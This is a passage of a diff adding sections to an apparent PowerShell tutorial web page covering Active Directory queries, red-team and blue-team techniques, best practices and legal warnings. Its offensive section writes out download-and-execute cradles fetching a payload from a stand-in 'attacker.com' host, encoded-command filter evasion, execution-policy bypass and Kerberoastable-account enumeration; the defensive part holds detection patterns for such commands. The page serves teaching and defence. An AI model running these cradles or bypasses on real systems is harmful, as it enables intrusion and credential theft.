+            Active Directory Automation
+        </h2>
+        <p>
+            PowerShell is <strong>the</strong> way to manage Active Directory at scale. These commands are essential for sysadmins and red teamers alike.
+        </p>
+
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Import AD module</span>
+<span class="fn">Import-Module</span> ActiveDirectory
+
+<span class="cmt"># List all users</span>
+<span class="fn">Get-ADUser</span> -Filter *
+
+<span class="cmt"># Find users with "admin" in name</span>
+<span class="fn">Get-ADUser</span> -Filter { Name -like <span class="str">"*admin*"</span> } |
+    <span class="fn">Select-Object</span> SamAccountName, Enabled
+
+<span class="cmt"># List domain admins (juicy for red team)</span>
+<span class="fn">Get-ADGroupMember</span> -Identity <span class="str">"Domain Admins"</span>
+
+<span class="cmt"># Find computers that haven't logged in for 90 days</span>
+<span class="var">$days</span> = (<span class="fn">Get-Date</span>).<span class="fn">AddDays</span>(-<span class="num">90</span>)
+<span class="fn">Get-ADComputer</span> -Filter { LastLogonTimeStamp -lt <span class="var">$days</span> } `
+    -Properties LastLogonTimeStamp
+
+<span class="cmt"># Find Kerberoastable accounts (red team)</span>
+<span class="fn">Get-ADUser</span> -Filter { ServicePrincipalName -ne <span class="str">"$null"</span> } `
+    -Properties ServicePrincipalName
+
+<span class="cmt"># Get all groups</span>
+<span class="fn">Get-ADGroup</span> -Filter * | <span class="fn">Select-Object</span> Name, GroupCategory</code>
+        </div>
+    </section>
+
+    <!-- ===== 12 SECURITY ===== -->
+    <section class="section" id="security">
+        <span class="section-number">12 · OFFENSIVE POWERSHELL</span>
+        <h2 class="section-title">
+            <span class="icon">💥</span>
+            Offensive PowerShell (Red Team)
+        </h2>
+        <p>
+            PowerShell is the <strong>#1 post-exploitation tool</strong> on Windows. It's installed everywhere, trusted by the OS, and can run in memory without touching disk. Here are the key techniques used by red teams (for <em>authorized</em> engagements only).
+        </p>
+
+        <h3>Download &amp; Execute (Cradles)</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Download and run a script in memory</span>
+<span class="fn">IEX</span> (<span class="fn">New-Object</span> Net.WebClient).<span class="fn">DownloadString</span>(<span class="str">"http://attacker.com/payload.ps1"</span>)
+
+<span class="cmt"># Using Invoke-WebRequest</span>
+<span class="var">$s</span> = <span class="fn">Invoke-WebRequest</span> -Uri <span class="str">"http://attacker.com/payload.ps1"</span> -UseBasicParsing
+<span class="fn">Invoke-Expression</span> <span class="var">$s</span>.Content
+
+<span class="cmt"># Base64-encoded command (bypasses some filters)</span>
+<span class="var">$cmd</span> = <span class="str">"whoami"</span>
+<span class="var">$bytes</span> = [System.Text.Encoding]::Unicode.<span class="fn">GetBytes</span>(<span class="var">$cmd</span>)
+<span class="var">$b64</span> = [Convert]::<span class="fn">ToBase64String</span>(<span class="var">$bytes</span>)
+<span class="fn">powershell</span> -EncodedCommand <span class="var">$b64</span></code>
+        </div>
+
+        <h3>Execution Policy Bypass</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Bypass execution policy for current session</span>
+<span class="fn">Set-ExecutionPolicy</span> Bypass -Scope Process
+
+<span class="cmt"># Run script with bypass (from CMD)</span>
+<span class="fn">powershell</span> -ExecutionPolicy Bypass -File script.ps1
+
+<span class="cmt"># Check current policy</span>
+<span class="fn">Get-ExecutionPolicy</span> -List</code>
+        </div>
+
+        <h3>Key Offensive Tools</h3>
+        <div class="tool-grid">
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">⚡</span> PowerSploit</div>
+                <p>Classic collection of PowerShell exploitation scripts.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🎯</span> Empire / Starkiller</div>
+                <p>Post-exploitation C2 framework built on PowerShell.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🔍</span> PowerView</div>
+                <p>AD reconnaissance — enumerate users, groups, ACLs, trusts.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">💉</span> Invoke-Mimikatz</div>
+                <p>Dump credentials from memory via PowerShell.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🕵️</span> Nishang</div>
+                <p>Offensive PowerShell scripts — reverse shells, keyloggers, exfil.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">⚙️</span> AMSI Bypass</div>
+                <p>Bypass the Anti-Malware Scan Interface for undetected execution.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🔐</span> Invoke-Obfuscation</div>
+                <p>Obfuscate PowerShell scripts to evade AV and EDR.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">📡</span> Covenant</div>
+                <p>Modern .NET C2 framework with PowerShell support.</p>
             </div>
         </div>
 
-    </div>
+        <div class="callout warn">
+            <strong>⚠️ Legal Warning:</strong> Using these techniques against systems you don't own or have explicit written permission to test is <strong>a serious federal crime</strong> in most countries. Only use in authorized pentests, red team engagements, or legal labs.
+        </div>
+    </section>
+
+    <!-- ===== 13 DEFENSE ===== -->
+    <section class="section" id="defense">
+        <span class="section-number">13 · DEFENSIVE POWERSHELL</span>
+        <h2 class="section-title">
+            <span class="icon">🛡️</span>
+            Defensive PowerShell (Blue Team)
+        </h2>
+        <p>
+            Blue teamers use PowerShell to <strong>hunt threats</strong>, parse logs, and respond to incidents at scale.
+        </p>
+
+        <h3>Log Analysis</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Get failed login attempts (Event ID 4625)</span>
+<span class="fn">Get-WinEvent</span> -FilterHashtable @{
+    LogName = <span class="str">'Security'</span>
+    Id = <span class="num">4625</span>
+} -MaxEvents <span class="num">50</span> |
+    <span class="fn">Select-Object</span> TimeCreated, Message
+
+<span class="cmt"># Get PowerShell script block logging (Event ID 4104)</span>
+<span class="fn">Get-WinEvent</span> -LogName <span class="str">'Microsoft-Windows-PowerShell/Operational'</span> |
+    <span class="fn">Where-Object</span> { <span class="var">$_</span>.Id -eq <span class="num">4104</span> } |
+    <span class="fn">Select-Object</span> TimeCreated, Message -First <span class="num">20</span>
+
+<span class="cmt"># Find suspicious encoded commands</span>
+<span class="fn">Get-WinEvent</span> -LogName <span class="str">'Security'</span> |
+    <span class="fn">Where-Object</span> { <span class="var">$_</span>.Message -match <span class="str">"-EncodedCommand|-enc "</span> }</code>
+        </div>
+
+        <h3>Threat Hunting</h3>
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Find processes with suspicious command lines</span>
+<span class="fn">Get-CimInstance</span> Win32_Process |
+    <span class="fn">Where-Object</span> {
+        <span class="var">$_</span>.CommandLine -match <span class="str">"downloadstring|iex|invoke-expression"</span>
+    } | <span class="fn">Select-Object</span> Name, CommandLine, ProcessId
+
+<span class="cmt"># Find suspicious scheduled tasks</span>
+<span class="fn">Get-ScheduledTask</span> | <span class="fn">Where-Object</span> {
+    <span class="var">$_</span>.TaskPath -notlike <span class="str">"\Microsoft\*"</span>
+} | <span class="fn">Select-Object</span> TaskName, State
+
+<span class="cmt"># Find recently modified executables in user dirs</span>
+<span class="fn">Get-ChildItem</span> <span class="var">$env:APPDATA</span>, <span class="var">$env:TEMP</span> -Recurse -Include *.exe, *.ps1 |
+    <span class="fn">Where-Object</span> { <span class="var">$_</span>.LastWriteTime -gt (<span class="fn">Get-Date</span>).<span class="fn">AddDays</span>(-<span class="num">7</span>) }</code>
+        </div>
+
+        <h3>Hardening Recommendations</h3>
+        <ul>
+            <li><strong>Enable Script Block Logging</strong> — Logs every PowerShell command (Event ID 4104).</li>
+            <li><strong>Enable Module Logging</strong> — Tracks cmdlet usage.</li>
+            <li><strong>Enable Transcription</strong> — Saves all sessions to text files.</li>
+            <li><strong>Constrain Language Mode</strong> — Restrict PowerShell to safe commands.</li>
+            <li><strong>Use AppLocker / WDAC</strong> — Whitelist scripts and executables.</li>
+            <li><strong>Deploy AMSI</strong> — Detects malicious scripts at runtime.</li>
+            <li><strong>Set Execution Policy to AllSigned</strong> — Requires signed scripts.</li>
+            <li><strong>Disable PowerShell v2</strong> — Old version has no logging.</li>
+            <li><strong>Restrict WinRM</strong> — Only allow from trusted hosts.</li>
+            <li><strong>Monitor for encoded commands</strong> — Common attacker signature.</li>
+        </ul>
+    </section>
+
+    <!-- ===== 14 BEST ===== -->
+    <section class="section" id="best">
+        <span class="section-number">14 · BEST PRACTICES</span>
+        <h2 class="section-title">
+            <span class="icon">✅</span>
+            Best Practices
+        </h2>
+        <ol>
+            <li><strong>Use <code>Get-Help</code></strong> — Every cmdlet has built-in documentation.</li>
+            <li><strong>Use approved verbs</strong> — <code>Get-Verb</code> shows the list. Use <code>Get-</code>, <code>Set-</code>, <code>New-</code>.</li>
+            <li><strong>Prefer objects over text</strong> — Never parse text when you can work with objects.</li>
+            <li><strong>Use CmdletBinding</strong> — For advanced functions with parameter validation.</li>
+            <li><strong>Handle errors</strong> — Use <code>try/catch</code> and <code>-ErrorAction</code>.</li>
+            <li><strong>Use <code>-WhatIf</code> and <code>-Confirm</code></strong> — Test destructive operations safely.</li>
+            <li><strong>Store credentials securely</strong> — Use <code>Get-Credential</code>, never hardcode.</li>
+            <li><strong>Sign your scripts</strong> — Use code signing for production scripts.</li>
+            <li><strong>Follow PSScriptAnalyzer</strong> — Lint your scripts for best practices.</li>
+            <li><strong>Comment with <code>&lt;#  #&gt;</code></strong> — Use help-based comments for advanced functions.</li>
+        </ol>
+
+        <div class="code-block" data-lang="powershell">
+<code><span class="cmt"># Enforce strict error handling</span>
+<span class="var">$ErrorActionPreference</span> = <span class="str">"Stop"</span>
+<span class="fn">Set-StrictMode</span> -Version Latest
+
+<span class="cmt"># Safe delete with -WhatIf</span>
+<span class="fn">Remove-Item</span> C:\Temp\* -Recurse -WhatIf
+
+<span class="cmt"># Then actually delete after confirming</span>
+<span class="fn">Remove-Item</span> C:\Temp\* -Recurse -Confirm</code>
+        </div>
+    </section>
+
+    <!-- ===== 15 LEGAL ===== -->
+    <section class="section" id="legal">
+        <span class="section-number">15 · LEGAL &amp; ETHICS</span>
+        <h2 class="section-title">
+            <span class="icon">⚖️</span>
+            Legal &amp; Ethical Boundaries
+        </h2>
+        <div class="callout warn">
+            <strong>⚠️ Critical Warning:</strong> Learning PowerShell is legal. Using offensive techniques against systems you don't own or have explicit written permission to test is a <strong>serious federal crime</strong>. Unauthorized access can lead to imprisonment, massive fines, and a permanent criminal record.
+        </div>
+
+        <h3>Legal Practice Environments</h3>
+        <div class="tool-grid">
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🧪</span> TryHackMe</div>
+                <p>Guided Windows and Active Directory rooms for learning pentesting.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🎯</span> Hack The Box</div>
+                <p>Realistic Windows machines and AD labs.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🔴</span> GOAD</div>
+                <p>Game of Active Directory — free, full AD lab on your own hardware.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">💀</span> DetectionLab</div>
+                <p>Build a full detection lab with Windows, AD, and logging.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🏢</span> Your own VMs</div>
+                <p>Spin up a Windows Server + Windows 10 lab in VirtualBox.</p>
+            </div>
+            <div class="tool-card">
+                <div class="tool-name"><span class="ico">🎓</span> Microsoft Learn</div>
+                <p>Free official PowerShell training and documentation.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== 16 CONCLUSION ===== -->
+    <section class="section" id="conclusion">
+        <span class="section-number">16 · CONCLUSION</span>
+        <h2 class="section-title">
+            <span class="icon">🎓</span>
+            Final Thoughts
+        </h2>
+        <p>
+            PowerShell is the <strong>most powerful automation tool on Windows</strong> — bar none. Whether you're a sysadmin managing thousands of servers, a red teamer performing post-exploitation, or a blue teamer hunting threats, PowerShell is essential to your workflow.
+        </p>
+        <p>
+            Its combination of <em>object-oriented pipelines</em>, <em>deep Windows integration</em>, and <em>remote management</em> makes it uniquely powerful. And because it's installed by default on every modern Windows system, it's also the most trusted execution environment — which makes it a favorite for attackers.
+        </p>
+        <p>
+            The journey follows a clear path:
+        </p>
+        <ol>
+            <li><strong>Learn cmdlets</strong> — Master <code>Get-Command</code>, <code>Get-Help</code>, <code>Get-Member</code>.</li>
+            <li><strong>Master the pipeline</strong> — Filter, sort, group, and select objects.</li>
+            <li><strong>Write scripts</strong> — Automate repetitive admin tasks.</li>
+            <li><strong>Build functions</strong> — Modular, reusable, parameterized.</li>
+            <li><strong>Learn remoting</strong> — Manage remote systems at scale.</li>
+            <li><strong>Explore AD</strong> — Enumerate users, groups, and permissions.</li>
+            <li><strong>Study offensive/defensive</strong> — Both sides of the coin.</li>
+        </ol>
+        <div class="callout">
+            <strong>🚀 Next Steps:</strong> Open PowerShell on a Windows VM. Run <code>Get-Process | Sort-Object CPU -Descending | Select-Object -First 10</code>. Then write your first function. Then import it into a module. Within weeks, you'll be automating like a pro.
+        </div>
+        <p style="text-align:center; margin-top: 30px; font-size: 17px; color: #00ff88; font-weight: 600;">
+            Happy hacking — ethically. 🪟
+        </p>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="page-footer">
+        <p>© 2025 · <span class="brand">⚡ cyber·sume</span> · PowerShell Automation</p>
+        <p style="margin-top: 8px; font-size: 12px;">Complete Guide · Beginner to Advanced · Updated 2025</p>
+    </footer>
 
 </div>
+
+</body>
+</html>
